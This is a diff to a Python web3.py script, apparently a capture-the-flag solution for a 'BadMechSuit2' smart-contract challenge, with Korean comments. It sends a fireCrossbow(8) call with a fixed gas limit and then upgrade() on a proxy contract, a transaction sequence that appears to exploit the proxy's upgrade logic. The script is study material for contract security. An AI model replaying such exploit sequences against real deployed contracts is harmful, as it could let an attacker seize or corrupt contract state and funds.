@@ -1,41 +1,13 @@
 from web3 import Web3
-
-# 풀이
-# 1. 
-
-# 문제에서 사용하는 각종 정보 추출
-def parse_env_to_dict(env_file_path):
-    env_dict = {}
-
-    # Read the .env file line by line
-    with open(env_file_path, "r") as file:
-        for line in file:
-            # Strip whitespace and ignore comments or empty lines
-            line = line.strip()
-            if not line or line.startswith("#"):
-                continue
-
-            # Split key and value on the first '='
-            key, _, value = line.partition("=")
-            key = key.strip()
-            value = value.strip()
-
-            # Remove quotes from the value if present
-            if (value.startswith('"') and value.endswith('"')) or (value.startswith("'") and value.endswith("'")):
-                value = value[1:-1]
-
-            # Add to dictionary
-            env_dict[key] = value
-
-    return env_dict
+from dotenv import dotenv_values
 
 ENV_PATH = "../.env"
 
-dict_output = parse_env_to_dict(ENV_PATH)
+dict_output = dotenv_values(ENV_PATH)
 
 RPC_URI = dict_output['WEB3_PROVIDER_URI']
 
-CONTRACT_ADDRESS = '0xb1833D0AB482998fd6e8A91ba4223485827C168b'
+CONTRACT_ADDRESS = '0x402b1203392b3baD715fEb606Bcb5f5dc307C417'
 PRIVATE_KEY = '0x' + dict_output['USER_ADDRESS_PRIVATE_KEY']
 
 web3 = Web3(Web3.HTTPProvider(RPC_URI))
@@ -113,10 +85,13 @@ SUITLOGICV2_ABI = [
     }
 ]
 
-contract_badmechsuit2 = web3.eth.contract(address=CONTRACT_ADDRESS, abi=BADMECHSUIT2_ABI)
+print("---- TRIGGER SuitLogicV1.fireCrossbow(8) ----")
 
-tx = contract_badmechsuit2.functions.upgrade().build_transaction({
+contract_badmechsuit2 = web3.eth.contract(address=CONTRACT_ADDRESS, abi=SUITLOGICV1_ABI)
+
+tx = contract_badmechsuit2.functions.fireCrossbow(8).build_transaction({
     'from' : USER_ADDRESS,
+    'gas' : 30000,
     'nonce' : web3.eth.get_transaction_count(USER_ADDRESS),
 })
 
@@ -125,3 +100,31 @@ signed_tx = web3.eth.account.sign_transaction(tx, PRIVATE_KEY)
 tx_hash = web3.eth.send_raw_transaction(signed_tx.raw_transaction)
 
 print(f"Transaction Hash: {web3.to_hex(tx_hash)}")
+
+# 트랜잭션 결과 확인
+tx_receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
+print(f"Transaction Receipt: {tx_receipt}\n")
+
+print("---- CHANGE LOGIC CONTRACT SuitLogicV1 to V2 ----")
+
+contract_badmechsuit2 = web3.eth.contract(address=CONTRACT_ADDRESS, abi=BADMECHSUIT2_ABI)
+
+tx = contract_badmechsuit2.functions.upgrade().build_transaction({
+    'from' : USER_ADDRESS,
+    'gas' : '0',
+    'nonce' : web3.eth.get_transaction_count(USER_ADDRESS),
+})
+
+gas = web3.eth.estimate_gas(tx)
+
+tx.update({'gas': gas})
+
+# 트랜젝션 서명 및 전송
+signed_tx = web3.eth.account.sign_transaction(tx, PRIVATE_KEY)
+tx_hash = web3.eth.send_raw_transaction(signed_tx.raw_transaction)
+
+print(f"Transaction Hash: {web3.to_hex(tx_hash)}")
+
+# 트랜잭션 결과 확인
+tx_receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
+print(f"Transaction Receipt: {tx_receipt}")
